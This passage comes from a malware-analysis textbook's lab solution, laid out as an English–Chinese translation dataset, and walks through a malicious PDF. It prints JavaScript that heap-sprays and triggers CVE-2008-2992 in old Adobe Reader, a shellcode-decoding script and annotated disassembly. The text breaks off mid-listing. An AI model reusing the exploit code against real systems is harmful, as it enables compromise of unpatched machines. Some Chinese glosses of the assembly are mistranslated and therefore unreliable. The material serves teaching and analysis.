  zh: 列表 19-11L 显示了此 PDF 中的对象 9 0。此对象包含在文档打开时将执行的 JavaScript。
- en: 9 0 obj
  id: totrans-6790
  prefs: []
  type: TYPE_NORMAL
  zh: 9 0 obj
- en: '<<'
  id: totrans-6791
  prefs: []
  type: TYPE_NORMAL
  zh: '<<'
- en: /Length 3486
  id: totrans-6792
  prefs: []
  type: TYPE_NORMAL
  zh: /Length 3486
- en: '>>'
  id: totrans-6793
  prefs: []
  type: TYPE_NORMAL
  zh: '>>'
- en: stream
  id: totrans-6794
  prefs: []
  type: TYPE_NORMAL
  zh: stream
- en: var payload = unescape("%ue589%uec81 .... %u9090"); 
  id: totrans-6795
  prefs: []
  type: TYPE_NORMAL
  zh: var payload = unescape("%ue589%uec81 .... %u9090"); 
- en: var version = app.viewerVersion;
  id: totrans-6796
  prefs: []
  type: TYPE_NORMAL
  zh: var version = app.viewerVersion;
- en: app.alert("Running PDF JavaScript!");
  id: totrans-6797
  prefs: []
  type: TYPE_NORMAL
  zh: app.alert("正在运行 PDF JavaScript！");
- en: if (version >= 8 && version < 9) { 
  id: totrans-6798
  prefs: []
  type: TYPE_NORMAL
  zh: if (version >= 8 && version < 9) { 
- en: var payload;
  id: totrans-6799
  prefs: []
  type: TYPE_NORMAL
  zh: var payload;
- en: nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
  id: totrans-6800
  prefs: []
  type: TYPE_NORMAL
  zh: nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
- en: heapblock = nop + payload;
  id: totrans-6801
  prefs: []
  type: TYPE_NORMAL
  zh: heapblock = nop + payload;
- en: bigblock = unescape("%u0A0A%u0A0A");
  id: totrans-6802
  prefs: []
  type: TYPE_NORMAL
  zh: bigblock = unescape("%u0A0A%u0A0A");
- en: headersize = 20;
  id: totrans-6803
  prefs: []
  type: TYPE_NORMAL
  zh: headersize = 20;
- en: spray = headersize+heapblock.length;
  id: totrans-6804
  prefs: []
  type: TYPE_NORMAL
  zh: spray = headersize+heapblock.length;
- en: while (bigblock.length<spray) {
  id: totrans-6805
  prefs: []
  type: TYPE_NORMAL
  zh: while (bigblock.length<spray) {
- en: bigblock+=bigblock;
  id: totrans-6806
  prefs: []
  type: TYPE_NORMAL
  zh: bigblock+=bigblock;
- en: '}'
  id: totrans-6807
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: fillblock = bigblock.substring(0, spray);
  id: totrans-6808
  prefs: []
  type: TYPE_NORMAL
  zh: fillblock = bigblock.substring(0, spray);
- en: block = bigblock.substring(0, bigblock.length-spray);
  id: totrans-6809
  prefs: []
  type: TYPE_NORMAL
  zh: block = bigblock.substring(0, bigblock.length-spray);
- en: '**704**'
  id: totrans-6810
  prefs: []
  type: TYPE_NORMAL
  zh: '**704**'
- en: Appendix C
  id: totrans-6811
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6812
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: while(block.length+spray < 0x40000) { 
  id: totrans-6813
  prefs: []
  type: TYPE_NORMAL
  zh: while(block.length+spray < 0x40000) { 
- en: block = block+block+fillblock;
  id: totrans-6814
  prefs: []
  type: TYPE_NORMAL
  zh: block = block+block+fillblock;
- en: '}'
  id: totrans-6815
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: mem = new Array();
  id: totrans-6816
  prefs: []
  type: TYPE_NORMAL
  zh: mem = new Array();
- en: for (i=0;i<1400;i++) {
  id: totrans-6817
  prefs: []
  type: TYPE_NORMAL
  zh: for (i=0;i<1400;i++) {
- en: mem[i] = block + heapblock;
  id: totrans-6818
  prefs: []
  type: TYPE_NORMAL
  zh: mem[i] = block + heapblock;
- en: '}'
  id: totrans-6819
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: var num = 12999999999999999999888888888888...;
  id: totrans-6820
  prefs: []
  type: TYPE_NORMAL
  zh: var num = 12999999999999999999888888888888...;
- en: util.printf("%45000f",num); 
  id: totrans-6821
  prefs: []
  type: TYPE_NORMAL
  zh: util.printf("%45000f",num); 
- en: '} else {'
  id: totrans-6822
  prefs: []
  type: TYPE_NORMAL
  zh: '} else {'
- en: app.alert("Unknown PDF version!");
  id: totrans-6823
  prefs: []
  type: TYPE_NORMAL
  zh: app.alert("未知 PDF 版本！");
- en: '}'
  id: totrans-6824
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: endstream
  id: totrans-6825
  prefs: []
  type: TYPE_NORMAL
  zh: endstream
- en: endobj
  id: totrans-6826
  prefs: []
  type: TYPE_NORMAL
  zh: endobj
- en: '*Listing 19-11L: PDF JavaScript object*'
  id: totrans-6827
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-11L：PDF JavaScript 对象*'
- en: The JavaScript examines the application version at  to determine whether it
    should attempt the exploit. Having the ability to run active content like this
    to profile the system is very powerful for attackers because it allows them to
    profile a system and to choose the exploit most likely to succeed.
  id: totrans-6828
  prefs: []
  type: TYPE_NORMAL
  zh: JavaScript 检查应用版本在  以确定是否尝试利用。能够运行此类活动内容来分析系统对攻击者来说非常强大，因为它允许他们分析系统并选择最有可能成功的利用方式。
- en: 'The script then performs a heap spray at , followed by the call to util.printf
    at , which will trigger the exploit. This line should look suspicious due to
    the very large number that is being printed. In fact, an Internet search reveals
    a fairly old vulnerability: CVE-2008-2992, where improper bounds checking allows
    an overflow to occur in Adobe Reader 8.1.2 and earlier.'
  id: totrans-6829
  prefs: []
  type: TYPE_NORMAL
  zh: 然后脚本在  处执行堆喷，随后调用 util.printf 在 ，这将触发利用。由于打印的数字非常大，这一行看起来很可疑。实际上，网络搜索揭示了一个相当古老的漏洞：CVE-2008-2992，其中不正确的边界检查允许在
    Adobe Reader 8.1.2 及更早版本中发生溢出。
- en: '**NOTE**'
  id: totrans-6830
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*A* heap spray *involves making many copies of the shellcode over large areas
    of the process heap, along with large NOP sleds. The attackers then exploit a
    vulnerability and* *overwrite a function pointer or return address with a value
    that points somewhere into* *the memory heap. The attackers select a value that
    points into the known process heap* *memory segment. The likelihood that the selected
    value points to a NOP sled leading* *into a valid copy of the shellcode is high
    enough to make this a reliable way of gaining* *execution. Heap sprays are popular
    in situations where the attacker can execute some* *code on the targeted system
    prior to launching the exploit, such as this case with* *JavaScript in the PDF.*'
  id: totrans-6831
  prefs: []
  type: TYPE_NORMAL
  zh: '*堆喷射*涉及在进程堆的广大区域制作shellcode的多个副本，以及大型的NOP滑梯。攻击者随后利用漏洞，并用指向内存堆内存段某处的值覆盖函数指针或返回地址。攻击者选择一个指向已知进程堆内存段某处的值，该值指向NOP滑梯并进入有效的shellcode副本的可能性足够高，足以使这种方法成为获取执行的一种可靠方式。堆喷射在攻击者可以在启动利用之前在目标系统上执行一些代码的情况下很受欢迎，例如在这个PDF中的JavaScript案例。'
- en: 'The payload variable is initialized in Listing 19-11L at  using the unescape
    function with a long text string. The unescape function works by translating each
    % character as follows:'
  id: totrans-6832
  prefs: []
  type: TYPE_NORMAL
  zh: 负载变量在列表19-11L中使用unescape函数和长文本字符串初始化。unescape函数通过以下方式转换每个%字符：
- en: 
  id: totrans-6833
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: If the % is followed by a u, it takes the next four characters, treats them
    as **1 9**
  id: totrans-6834
  prefs: []
  type: TYPE_NORMAL
  zh: 如果%后面跟着u，它将取下四个字符，将它们视为**1 9**
- en: ASCII hex, and translates this into 2 bytes. The output order will be byte-swapped
    due to its endianness.
  id: totrans-6835
  prefs: []
  type: TYPE_NORMAL
  zh: ASCII十六进制数，并将其转换为2个字节。由于它的端序，输出顺序将进行字节交换。
- en: 
  id: totrans-6836
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: If the % is not followed by a u, it takes the next two characters, treats them
    as ASCII hex, and translates this into 1 byte.
  id: totrans-6837
  prefs: []
  type: TYPE_NORMAL
  zh: 如果%后面没有跟u，它将取下两个字符，将它们视为ASCII十六进制数，并将其转换为1个字节。
- en: Solutions to Labs
  id: totrans-6838
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**705**'
  id: totrans-6839
  prefs: []
  type: TYPE_NORMAL
  zh: '**705**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6840
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: For example, the string begins with %ue589%uec81%u017c and will be transformed
    into the hex sequence 0x89 0xe5 0x81 0xec 0x7c 0x01\. You can use the Python script
    in Listing 19-12L to manually unescape the shellcode payload and turn it into
    a binary file suitable for further analysis, or you can use the file *Lab19-03_sc.bin*,
    which contains the decoded contents provided with the labs.
  id: totrans-6841
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，字符串以%ue589%uec81%u017c开头，并将转换为十六进制序列0x89 0xe5 0x81 0xec 0x7c 0x01。您可以使用列表19-12L中的Python脚本来手动unescape
    shellcode负载并将其转换为适合进一步分析的二进制文件，或者您可以使用包含实验室提供的解码内容的*Lab19-03_sc.bin*文件。
- en: 'def decU16(inbuff):'
  id: totrans-6842
  prefs: []
  type: TYPE_NORMAL
  zh: 'def decU16(inbuff):'
- en: '"""'
  id: totrans-6843
  prefs: []
  type: TYPE_NORMAL
  zh: '"""'
- en: Manually perform JavaScript's unescape() function.
  id: totrans-6844
  prefs: []
  type: TYPE_NORMAL
  zh: 手动执行JavaScript的unescape()函数。
- en: '"""'
  id: totrans-6845
  prefs: []
  type: TYPE_NORMAL
  zh: '"""'
- en: i = 0
  id: totrans-6846
  prefs: []
  type: TYPE_NORMAL
  zh: i = 0
- en: outArr = [ ]
  id: totrans-6847
  prefs: []
  type: TYPE_NORMAL
  zh: outArr = [ ]
- en: 'while i < len(inbuff):'
  id: totrans-6848
  prefs: []
  type: TYPE_NORMAL
  zh: 'while i < len(inbuff):'
- en: 'if inbuff[i] == ''"'':'
  id: totrans-6849
  prefs: []
  type: TYPE_NORMAL
  zh: 'if inbuff[i] == ''"'':'
- en: i += 1
  id: totrans-6850
  prefs: []
  type: TYPE_NORMAL
  zh: i += 1
- en: 'elif inbuff[i] == ''%'':'
  id: totrans-6851
  prefs: []
  type: TYPE_NORMAL
  zh: 'elif inbuff[i] == ''%'':'
- en: 'if ((i+6) <= len(inbuff)) and (inbuff[i+1] == ''u''):'
  id: totrans-6852
  prefs: []
  type: TYPE_NORMAL
  zh: 'if ((i+6) <= len(inbuff)) and (inbuff[i+1] == ''u''):'
- en: '#it''s a 2-byte "unicode" value'
  id: totrans-6853
  prefs: []
  type: TYPE_NORMAL
  zh: '#这是一个2字节的“unicode”值'
- en: currchar = int(inbuff[i+2:i+4], 16)
  id: totrans-6854
  prefs: []
  type: TYPE_NORMAL
  zh: currchar = int(inbuff[i+2:i+4], 16)
- en: nextchar = int(inbuff[i+4:i+6], 16)
  id: totrans-6855
  prefs: []
  type: TYPE_NORMAL
  zh: nextchar = int(inbuff[i+4:i+6], 16)
- en: '#switch order for little-endian'
  id: totrans-6856
  prefs: []
  type: TYPE_NORMAL
  zh: '#switch order for little-endian'
- en: outArr.append(chr(nextchar))
  id: totrans-6857
  prefs: []
  type: TYPE_NORMAL
  zh: outArr.append(chr(nextchar))
- en: outArr.append(chr(currchar))
  id: totrans-6858
  prefs: []
  type: TYPE_NORMAL
  zh: outArr.append(chr(currchar))
- en: i += 6
  id: totrans-6859
  prefs: []
  type: TYPE_NORMAL
  zh: i += 6
- en: 'elif (i+3) <= len(inbuff):'
  id: totrans-6860
  prefs: []
  type: TYPE_NORMAL
  zh: 'elif (i+3) <= len(inbuff):'
- en: '#it''s just a single byte'
  id: totrans-6861
  prefs: []
  type: TYPE_NORMAL
  zh: '#这是一个单字节'
- en: currchar = int(inbuff[i+1:i+3], 16)
  id: totrans-6862
  prefs: []
  type: TYPE_NORMAL
  zh: currchar = int(inbuff[i+1:i+3], 16)
- en: outArr.append(chr(currchar))
  id: totrans-6863
  prefs: []
  type: TYPE_NORMAL
  zh: outArr.append(chr(currchar))
- en: i += 3
  id: totrans-6864
  prefs: []
  type: TYPE_NORMAL
  zh: i += 3
- en: 'else:'
  id: totrans-6865
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: nothing to change
  id: totrans-6866
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 没有需要更改的内容
- en: outArr.append(inbuff[i])
  id: totrans-6867
  prefs: []
  type: TYPE_NORMAL
  zh: outArr.append(inbuff[i])
- en: i += 1
  id: totrans-6868
  prefs: []
  type: TYPE_NORMAL
  zh: i += 1
- en: return ''.join(outArr)
  id: totrans-6869
  prefs: []
  type: TYPE_NORMAL
  zh: return ''.join(outArr)
- en: payload = "%ue589%uec81 ... %u9008%u9090"
  id: totrans-6870
  prefs: []
  type: TYPE_NORMAL
  zh: payload = "%ue589%uec81 ... %u9008%u9090"
- en: outFile = file('Lab19-03_sc.bin', 'wb')
  id: totrans-6871
  prefs: []
  type: TYPE_NORMAL
  zh: outFile = file('Lab19-03_sc.bin', 'wb')
- en: outFile.write(decU16(payload))
  id: totrans-6872
  prefs: []
  type: TYPE_NORMAL
  zh: outFile.write(decU16(payload))
- en: outFile.close()
  id: totrans-6873
  prefs: []
  type: TYPE_NORMAL
  zh: outFile.close()
- en: '*Listing 19-12L: Python unescape() equivalent script*'
  id: totrans-6874
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 19-12L: Python unescape() equivalent script*'
- en: 'You can dynamically analyze the shellcode using the following command: shellcode_launcher.exe
    –i Lab19-03_sc.bin –r Lab19-03.pdf –bp The –r option causes the program to open
    the specified file for reading prior to jumping to the shellcode, and it is required
    here because this piece of shellcode expects that there is an open file handle
    to the malicious media file.'
  id: totrans-6875
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以使用以下命令动态分析shellcode：shellcode_launcher.exe –i Lab19-03_sc.bin –r Lab19-03.pdf
    –bp The –r选项会导致程序在跳转到shellcode之前打开指定的文件进行读取，这是必需的，因为这段shellcode期望有一个指向恶意媒体文件的打开文件句柄。
- en: '**706**'
  id: totrans-6876
  prefs: []
  type: TYPE_NORMAL
  zh: '**706**'
- en: Appendix C
  id: totrans-6877
  prefs: []
  type: TYPE_NORMAL
  zh: Appendix C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6878
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The beginning of the shellcode in Listing 19-13L uses the call/pop technique
    to obtain a pointer to the global data starting at .
  id: totrans-6879
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-13L 中 shellcode 的开始使用 call/pop 技术获取从 开始的全局数据指针。
- en: 00000000 mov ebp, esp
  id: totrans-6880
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000 将 ebp 设置为 esp
- en: 00000002 sub esp, 17Ch
  id: totrans-6881
  prefs: []
  type: TYPE_NORMAL
  zh: 00000002 将 esp 减少到 17Ch
- en: 00000008 call sub_17B
  id: totrans-6882
  prefs: []
  type: TYPE_NORMAL
  zh: 00000008 调用子程序 sub_17B
- en: 0000000D dd 0EC0E4E8Eh  ; kernel32.dll:LoadLibraryA 00000011 dd 16B3FE72h ;
    kernel32.dll:CreateProcessA 00000015 dd 78B5B983h ; kernel32.dll:TerminateProcess
    00000019 dd 7B8F17E6h ; kernel32.dll:GetCurrentProcess 0000001D dd 5B8ACA33h ;
    kernel32.dll:GetTempPathA 00000021 dd 0BFC7034Fh ; kernel32.dll:SetCurrentDirectoryA
    00000025 dd 7C0017A5h ; kernel32.dll:CreateFileA 00000029 dd 0DF7D9BADh ; kernel32.dll:GetFileSize
    0000002D dd 76DA08ACh ; kernel32.dll:SetFilePointer 00000031 dd 10FA6516h ; kernel32.dll:ReadFile
    00000035 dd 0E80A791Fh ; kernel32.dll:WriteFile 00000039 dd 0FFD97FBh ; kernel32.dll:CloseHandle
    0000003D dd 0C0397ECh ; kernel32.dll:GlobalAlloc 00000041 dd 7CB922F6h ; kernel32.dll:GlobalFree
    00000045 dd 1BE1BB5Eh ; shell32.dll:ShellExecuteA 00000049 dd 0C602h ; PDF file
    size
  id: totrans-6883
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000D dd 0EC0E4E8Eh  ; kernel32.dll:LoadLibraryA 00000011 dd 16B3FE72h ;
    kernel32.dll:CreateProcessA 00000015 dd 78B5B983h ; kernel32.dll:TerminateProcess
    00000019 dd 7B8F17E6h ; kernel32.dll:GetCurrentProcess 0000001D dd 5B8ACA33h ;
    kernel32.dll:GetTempPathA 00000021 dd 0BFC7034Fh ; kernel32.dll:SetCurrentDirectoryA
    00000025 dd 7C0017A5h ; kernel32.dll:CreateFileA 00000029 dd 0DF7D9BADh ; kernel32.dll:GetFileSize
    0000002D dd 76DA08ACh ; kernel32.dll:SetFilePointer 00000031 dd 10FA6516h ; kernel32.dll:ReadFile
    00000035 dd 0E80A791Fh ; kernel32.dll:WriteFile 00000039 dd 0FFD97FBh ; kernel32.dll:CloseHandle
    0000003D dd 0C0397ECh ; kernel32.dll:GlobalAlloc 00000041 dd 7CB922F6h ; kernel32.dll:GlobalFree
    00000045 dd 1BE1BB5Eh ; shell32.dll:ShellExecuteA 00000049 dd 0C602h ; PDF 文件大小
- en: '0000004D dd 106Fh ; File #1 offset'
  id: totrans-6884
  prefs: []
  type: TYPE_NORMAL
  zh: '0000004D dd 106Fh ; 文件 #1 偏移'
- en: '00000051 dd 0A000h ; File #1 size'
  id: totrans-6885
  prefs: []
  type: TYPE_NORMAL
  zh: '00000051 dd 0A000h ; 文件 #1 大小'
- en: '00000055 dd 0B06Fh ; File #2 offset'
  id: totrans-6886
  prefs: []
  type: TYPE_NORMAL
  zh: '00000055 dd 0B06Fh ; 文件 #2 偏移'
- en: '00000059 dd 144Eh ; File #2 size'
  id: totrans-6887
  prefs: []
  type: TYPE_NORMAL
  zh: '00000059 dd 144Eh ; 文件 #2 大小'
- en: '*Listing 19-13L: Shellcode global data*'
  id: totrans-6888
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-13L：Shellcode 全局数据*'
- en: The shellcode in Listing 19-14L uses the same findKernel32Base and findSymbolByHash
    functions defined in Chapter 19 and in Lab 19-1\. As in Lab 19-2, the shellcode
    loops over the symbol hashes, resolves them, and stores them back to create a
    function pointer array. This is done 14 times for *kernel32* at . The shellcode
    then creates the string shell32 on the stack by pushing two DWORD values at 
    to use as an argument to LoadLibraryA.
  id: totrans-6889
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-14L 中的 shellcode 使用了第 19 章和实验 19-1 中定义的 findKernel32Base 和 findSymbolByHash
    函数。与实验 19-2 类似，shellcode 遍历符号哈希，解析它们并将它们存储回创建函数指针数组。这是在 处对 *kernel32* 执行的 14
    次。然后，shellcode 通过在 处推送两个 DWORD 值来在堆栈上创建字符串 shell32，用作 LoadLibraryA 的参数。
- en: A single export from *shell32.dll* is resolved and added to the function pointer
    array at .
  id: totrans-6890
  prefs: []
  type: TYPE_NORMAL
  zh: 从 *shell32.dll* 单独导出并添加到函数指针数组。
- en: 0000017B pop esi
  id: totrans-6891
  prefs: []
  type: TYPE_NORMAL
  zh: 0000017B 从 esi 中弹出
- en: 0000017C mov [ebp-14h], esi
  id: totrans-6892
  prefs: []
  type: TYPE_NORMAL
  zh: 0000017C 将 esi 存储在 ebp-14h
- en: 0000017F mov edi, esi
  id: totrans-6893
  prefs: []
  type: TYPE_NORMAL
  zh: 0000017F 将 edi 寄存器设置为 esi
- en: 00000181 mov ebx, esi
  id: totrans-6894
  prefs: []
  type: TYPE_NORMAL
  zh: 00000181 将 ebx 寄存器设置为 esi
- en: 00000183 call findKernel32Base
  id: totrans-6895
  prefs: []
  type: TYPE_NORMAL
  zh: 00000183 调用 findKernel32Base
- en: 00000188 mov [ebp-4], eax
  id: totrans-6896
  prefs: []
  type: TYPE_NORMAL
  zh: 00000188 将 eax 存储在 ebp-4
- en: 0000018B mov ecx, 0Eh 
  id: totrans-6897
  prefs: []
  type: TYPE_NORMAL
  zh: 0000018B 将 ecx 寄存器设置为 0Eh 
- en: '**1 9**'
  id: totrans-6898
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 9**'
- en: '00000190 loc_190:'
  id: totrans-6899
  prefs: []
  type: TYPE_NORMAL
  zh: '00000190 loc_190:'
- en: 00000190 lodsd
  id: totrans-6900
  prefs: []
  type: TYPE_NORMAL
  zh: 00000190 lodsd
- en: 00000191 push eax
  id: totrans-6901
  prefs: []
  type: TYPE_NORMAL
  zh: 00000191 推送 eax
- en: 00000192 push dword ptr [ebp-4]
  id: totrans-6902
  prefs: []
  type: TYPE_NORMAL
  zh: 00000192 推送 ebp-4 的双字指针
- en: 00000195 call findSymbolByHash
  id: totrans-6903
  prefs: []
  type: TYPE_NORMAL
  zh: 00000195 调用 findSymbolByHash
- en: 0000019A stosd
  id: totrans-6904
  prefs: []
  type: TYPE_NORMAL
  zh: 0000019A stosd
- en: 0000019B loop loc_190
  id: totrans-6905
  prefs: []
  type: TYPE_NORMAL
  zh: 0000019B loop loc_190
- en: 0000019D push 32336Ch ; l32\x00 
  id: totrans-6906
  prefs: []
  type: TYPE_NORMAL
  zh: 0000019D 推送 32336Ch ; l32\x00 
- en: Solutions to Labs
  id: totrans-6907
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**707**'
  id: totrans-6908
  prefs: []
  type: TYPE_NORMAL
  zh: '**707**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6909
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 000001A2 push 6C656873h ; shel 000001A7 mov eax, esp
  id: totrans-6910
  prefs: []
  type: TYPE_NORMAL
  zh: 000001A2 推送 6C656873h ; shel
- en: 000001A9 push eax
  id: totrans-6911
  prefs: []
  type: TYPE_NORMAL
  zh: 000001A9 推送 eax
- en: 000001AA call dword ptr [ebx] ; LoadLibraryA
  id: totrans-6912
  prefs: []
  type: TYPE_NORMAL
  zh: 000001AA 调用 [ebx] 的双字指针；LoadLibraryA
- en: 000001AC xchg eax, ecx
  id: totrans-6913
  prefs: []
  type: TYPE_NORMAL
  zh: 000001AC 交换 eax 和 ecx
- en: 000001AD lodsd
  id: totrans-6914
  prefs: []
  type: TYPE_NORMAL
  zh: 000001AD lodsd
- en: 000001AE push eax
  id: totrans-6915
  prefs: []
  type: TYPE_NORMAL
  zh: 000001AE 推送 eax
- en: 000001AF push ecx
  id: totrans-6916
  prefs: []
  type: TYPE_NORMAL
  zh: 000001AF 推送 ecx
- en: 000001B0 call findSymbolByHash
  id: totrans-6917
  prefs: []
  type: TYPE_NORMAL
  zh: 000001B0 调用 findSymbolByHash
- en: 000001B5 stosd 
  id: totrans-6918
  prefs: []
  type: TYPE_NORMAL
  zh: 000001B5 stosd 
- en: '*Listing 19-14L: Hash array processing*'
  id: totrans-6919
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-14L：哈希数组处理*'
- en: The shellcode in Listing 19-15L then calls the GetFileSize function in a loop.
    Given an open handle, this function returns the file size the handle corresponds
    to. It initializes the handle value to 0 at  and adds 4 to it on each iteration
    at . The result is compared against the value stored at offset 0x3c in the shellcode’s
    embedded data. This value is 0xC602, and it is the exact size of the malicious
    PDF. This is how the shellcode will find the existing open handle to the PDF document
    that Adobe Reader had opened prior to the exploit launching. (It is common to
    store encoded data in malicious media files because media files can be fairly
    large without raising suspicions.) The malware requires an open handle to the
    malicious media file to work as expected, which is why the –r flag to *shellcode_launcher.exe*
    must be provided for this sample to perform any work.
  id: totrans-6920
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-15L 中的 shellcode 然后循环调用 GetFileSize 函数。给定一个打开的句柄，这个函数返回与句柄对应的文件大小。它在 
    处将句柄值初始化为 0，并在每次迭代时将其加 4。结果与 shellcode 嵌入数据中偏移量为 0x3c 的值进行比较。这个值是 0xC602，它是恶意
    PDF 的确切大小。这就是 shellcode 将找到 Adobe Reader 在漏洞利用启动之前已打开的 PDF 文档的现有打开句柄的方式。（在恶意媒体文件中存储编码数据是常见的，因为媒体文件可以相当大而不会引起怀疑。）恶意软件需要一个指向恶意媒体文件的打开句柄才能按预期工作，这就是为什么必须为这个样本提供
    *shellcode_launcher.exe* 的 -r 标志以执行任何操作。
- en: 000001B6 xor esi, esi 
  id: totrans-6921
  prefs: []
  type: TYPE_NORMAL
  zh: 000001B6 将 esi 与自己异或 
- en: 000001B8 mov ebx, [ebp-14h]
  id: totrans-6922
  prefs: []
  type: TYPE_NORMAL
  zh: 000001B8 将 [ebp-14h] 的值移动到 ebx
- en: '000001BB loc_1BB:'
  id: totrans-6923
  prefs: []
  type: TYPE_NORMAL
  zh: '000001BB loc_1BB:'
- en: 000001BB add esi, 4 
  id: totrans-6924
  prefs: []
  type: TYPE_NORMAL
  zh: 000001BB 将 esi 加 4 
- en: 000001C1 lea eax, [ebp-8]
  id: totrans-6925
  prefs: []
  type: TYPE_NORMAL
  zh: 000001C1 将 eax 寄存器加载为 [ebp-8] 的值
- en: 000001C4 push eax
  id: totrans-6926
  prefs: []
  type: TYPE_NORMAL
  zh: 000001C4 将 eax 压入堆栈
- en: 000001C5 push esi
  id: totrans-6927
  prefs: []
  type: TYPE_NORMAL
  zh: 000001C5 将 esi 压入堆栈
- en: 000001C6 call dword ptr [ebx+1Ch] ; GetFileSize
  id: totrans-6928
  prefs: []
  type: TYPE_NORMAL
  zh: 000001C6 调用 [ebx+1Ch] 的双字指针 ; 获取文件大小
- en: 000001C9 cmp eax, [ebx+3Ch] ; PDF file size
  id: totrans-6929
  prefs: []
  type: TYPE_NORMAL
  zh: 000001C9 比较 eax 与 [ebx+3Ch] 的值 ; PDF 文件大小
- en: 000001CC jnz short loc_1BB
  id: totrans-6930
  prefs: []
  type: TYPE_NORMAL
  zh: 000001CC 如果不为零则跳转到 short loc_1BB
- en: 000001CE mov [ebp-8], esi
  id: totrans-6931
  prefs: []
  type: TYPE_NORMAL
  zh: 000001CE 将 esi 存入 [ebp-8]
- en: '*Listing 19-15L: PDF handle search*'
  id: totrans-6932
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-15L: PDF 处理器搜索*'
- en: One variant of the technique of finding the open handle of the malicious media
    file involves checking that the file size meets some minimum value, at which point
    the shellcode will search the file for specific markers that confirm that it is
    the correct handle. This variant saves the writers from storing the exact size
    of the output file within the shellcode.
  id: totrans-6933
  prefs: []
  type: TYPE_NORMAL
  zh: 寻找恶意媒体文件打开句柄的技术的一种变体涉及检查文件大小是否满足某个最小值，此时 shellcode 将在文件中搜索特定的标记以确认它是正确的句柄。这种变体使编写者免去了在
    shellcode 中存储输出文件确切大小的需要。
- en: The shellcode in Listing 19-16L allocates a buffer of memory at  based on the
    value stored at offset 0x44 in the embedded data. This stored value is the file
    size for the first file accessed in the malicious PDF.
  id: totrans-6934
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-16L 中的 shellcode 根据嵌入数据中偏移量为 0x44 的值在  处分配一块内存。这个存储的值是恶意 PDF 中第一个访问的文件的大小。
- en: 000001D1 xor edx, edx
  id: totrans-6935
  prefs: []
  type: TYPE_NORMAL
  zh: 000001D1 将 edx 与自己异或
- en: 000001D3 push dword ptr [ebx+44h] 
  id: totrans-6936
  prefs: []
  type: TYPE_NORMAL
  zh: 000001D3 将 [ebx+44h] 的双字指针压入堆栈 
- en: '**708**'
  id: totrans-6937
  prefs: []
  type: TYPE_NORMAL
  zh: '**708**'
- en: Appendix C
  id: totrans-6938
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6939
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 000001D6 push edx
  id: totrans-6940
  prefs: []
  type: TYPE_NORMAL
  zh: 000001D6 将 edx 压入堆栈
- en: 000001D7 call [ebx+sc0.GlobalAlloc]
  id: totrans-6941
  prefs: []
  type: TYPE_NORMAL
  zh: 000001D7 调用 [ebx+sc0.GlobalAlloc]
- en: 000001DA test eax, eax
  id: totrans-6942
  prefs: []
  type: TYPE_NORMAL
  zh: 000001DA 测试 eax, eax
- en: 000001DC jz loc_313
  id: totrans-6943
  prefs: []
  type: TYPE_NORMAL
  zh: 000001DC 如果为零则跳转到 loc_313
- en: 000001E2 mov [ebp-0Ch], eax
  id: totrans-6944
  prefs: []
  type: TYPE_NORMAL
  zh: 000001E2 将 eax 存入 [ebp-0Ch]
- en: 000001E5 xor edx, edx
  id: totrans-6945
  prefs: []
  type: TYPE_NORMAL
  zh: 000001E5 将 edx 与自己异或
- en: 000001E7 push edx
  id: totrans-6946
  prefs: []
  type: TYPE_NORMAL
  zh: 000001E7 将 edx 压入堆栈
